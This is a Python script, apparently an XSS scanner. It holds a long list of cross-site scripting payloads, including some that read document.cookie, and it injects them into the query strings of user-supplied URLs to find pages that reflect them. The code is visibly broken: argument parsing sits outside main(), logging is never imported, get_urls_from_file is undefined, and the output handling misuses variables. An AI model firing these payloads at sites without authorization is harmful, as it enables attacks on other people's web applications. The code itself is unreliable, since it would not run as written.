import os
import sys
import requests
import argparse
import time
import urllib.parse as urlparse
from urllib.parse import parse_qs
import re

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    print(
        "Selenium and/or webdriver_manager modules not found. "
        "Do you want to install them now? (y/n)"
    )
    answer = input("> ")
    if answer.lower() == "y":
        os.system("pip install selenium webdriver_manager")
        print("Modules installed. Please run the script again.")
    else:
        sys.exit(1)

XSS_STRINGS = {
    "js": [
        '<script>alert("XSS");</script>',
        '<img src=x onerror=alert("XSS")>',
        '<iframe src="javascript:alert(`XSS`)">',
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        '<img src="javascript:alert(`XSS`)">',
        '<video><source onerror="javascript:alert(`XSS`)" />',
        '<audio><source onerror="javascript:alert(`XSS`)" />',
        '<img src="1" onerror="alert(document.domain)" />',
        '<img src="1" onerror="prompt(document.cookie)" />',
        "<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>",
        '<img src=x onerror="prompt(/xss/.source)"/>',
        '<script>top.window.location.href="javascript:alert(`XSS`)";</script>',
        '<meta http-equiv="refresh" content="0;javascript:alert(`XSS`)" />',
        '<body onpageshow="javascript:alert(`XSS`)">',
        '<body onload="javascript:alert(`XSS`)">',
        '<img src=x:x onerror="alert(`XSS`)">',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K" />',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K" type="text/x-scriptlet" />',
    ],
    "html": [
        '<body onload=alert("XSS")>',
        '<svg><script>alert("XSS")</script></svg>',
        '<iframe src="javascript:alert(`XSS`)">',
        '<input value="javascript:alert(`XSS`)" />',
        '<textarea><script>alert("XSS");</script></textarea>',
        '<plaintext><script>alert("XSS");</script></plaintext>',
        '<title><script>alert("XSS");</script></title>',
        "<iframe srcdoc='&lt;img src=\"javascript:alert(`XSS`)\"&gt;'></iframe>",
        "<body onload=eval(atob(`YWxlcnQoJ2FsdGVybmF0aXZlbHlAZ21haWwuY29tJyk=`))>",
        '<img src="1" onerror="alert(document.domain)" />',
        '<img src="1" onerror="prompt(document.cookie)" />',
        '<marquee><script>alert("XSS");</script></marquee>',
        '<style>/*]]>*/</style><script>alert("XSS")</script>',
        '<input type="image" src="x" onerror="alert(`XSS`)"/>',
        '<base href="javascript:alert(`XSS`)"/>',
        '<object data="javascript:alert(`XSS`)"></object>',
    ],
    "attr": [
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '" autofocus onfocus=alert("XSS")><input type="hidden">',
        '" onclick=alert("XSS)//',
        '" ondblclick=alert("XSS")>',
        '" onfocus=alert(document.domain)><input type="hidden">',
        '"><img src=x onerror=alert(document.domain)>',
        '"><img src=x oneonerrorrror=alert("XSS")>',
        '"><svg><style>&lt;img src="</style><img src=x onerror=alert("XSS")>">',
        '" onmouseover=alert("XSS")><img src="',
        '" onmouseout=alert(String.fromCharCode(88,83,83))> ',
        '"><img src=x:x onerror=window.alert("XSS");>',
        '"><iframe src=javascript:alert("XSS")></iframe>',
        '"><form id=form1 name=form1 onsubmit=alert("XSS");><input type=submit></form><script>form1.submit()</script>',
        '<img src="javascript:alert(`XSS`)" onload="alert(`XSS`)" />',
    ],
    "svg": [
        '"><svg><script>alert("XSS")</script></svg>',
        '<svg onload=alert("XSS")>',
        '<script type="text/javascript"><![CDATA[alert("XSS");]]></script>',
        '<svg><script xlink:href="javascript:alert(`XSS`)"></script></svg>',
        '<style><img src="</style><img src=x onerror=alert(`XSS`)>">',
        '<polygon points="1" onmousemove="alert(`XSS`)"/>',
        '<path d="M0,0 L0,1" onmousemove="alert(`XSS`)"/>',
        '<animate attributeName="xlink:href" values="javascript:alert(`XSS`)" />',
    ],
}


def get_urls_from_input():
    url_types = {"1": "js", "2": "html", "3": "attr", "4": "svg", "5": "href"}
    selected_types = []
    while not selected_types:
        print("Select the types of XSS strings you want to use (comma-separated):")
        for i, t in url_types.items():
            print(f"{i}. {t}")
        selection = input("> ").split(",")
        for s in selection:
            if s.strip() in url_types:
                selected_types.append(url_types[s.strip()])
        if not selected_types:
            print("Invalid selection. Please try again.")
    urls = input("Enter URLs to test separated by commas: ")
    urls = urls.split(",")
    urls = [url.strip() for url in urls]
    return urls, selected_types


def has_query_string(url):
    return bool(urlparse.urlparse(url).query)


def inject_payload(url, payload):
    try:
        if has_query_string(url):
            url_parts = list(urlparse.urlparse(url))
            query = dict(parse_qs(url_parts[4]))
            for key in query:
                query[key] = f"{query[key]}{payload}"
            url_parts[4] = urlparse.urlencode(query)
            url = urlparse.urlunparse(url_parts)
        else:
            url += f"{payload}"
    except ValueError:
        print(f"Error injecting payload into {url}. Invalid query string.")
    return url


def scan_url(url, driver, selected_types):
    payloads = []
    try:
        response = requests.get(url)
        content = response.text
        words = content.split()
        for word in words:
            for key in selected_types:
                for string in XSS_STRINGS[key]:
                    payload = f"{string}{word}{string}"
                    if payload in payloads:
                        continue
                    payload_url = inject_payload(url, payload)
                    if payload in requests.get(payload_url).text:
                        print(f"[VULNERABLE] {payload_url}")
                        payloads.append(payload_url)
                    else:
                        print(f"[NOT VULNERABLE] {payload_url}")
    except requests.exceptions.RequestException:
        print(f"Error connecting to {url}. Skipping.")

    return payloads


def write_vulnerable_urls_to_file(file_path, urls):
    with open(file_path, "w") as f:
        f.write("\n".join(urls))


def main():
    parser = argparse.ArgumentParser(
        description="Scan a list of URLs for XSS vulnerabilities"
    )


parser.add_argument("-f", "--file", help="File containing list of URLs")
parser.add_argument(
    "-s",
    "--strings",
    choices=XSS_STRINGS.keys(),
    nargs="*",
    default=XSS_STRINGS.keys(),
    help="XSS string categories to use (default: all)",
)
parser.add_argument(
    "-o",
    "--output",
    metavar="FILE",
    help="Output file for vulnerable targets (default: vulnerable_urls.txt)",
    default="vulnerable_urls.txt",
)
parser.add_argument(
    "-n",
    "--no-output",
    help="Disable output of vulnerable targets",
    action="store_true",
)
parser.add_argument(
    "--log-level",
    choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
    help="Set the logging level (default: WARNING)",
    default="WARNING",
)

args = parser.parse_args()

if args.file:
    urls = get_urls_from_file(args.file)
else:
    urls, selected_types = get_urls_from_input()
if not urls:
    print("No URLs provided. Please provide a file or enter URLs.")
    sys.exit(1)

logging.basicConfig(level=args.log_level)
logger = logging.getLogger()

s = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=s)

vulnerable_urls = []
for url in urls:
    logger.info(f"Scanning {url}...")
    successful_payloads = scan_url(url, driver, selected_types)
    if successful_payloads:
        vulnerable_urls.extend(successful_payloads)

driver.quit()

if vulnerable_urls:
    logger.warning(f"{len(vulnerable_urls)} targets are affected:")
    for target in vulnerable_urls:
        logger.warning(f"{target} (payload: {target['payload']})")
    if not args.no_output:
        write_vulnerable_urls_to_file(args.output_file, vulnerable_urls)
else:
    logger.info("No targets were found to be vulnerable")
		
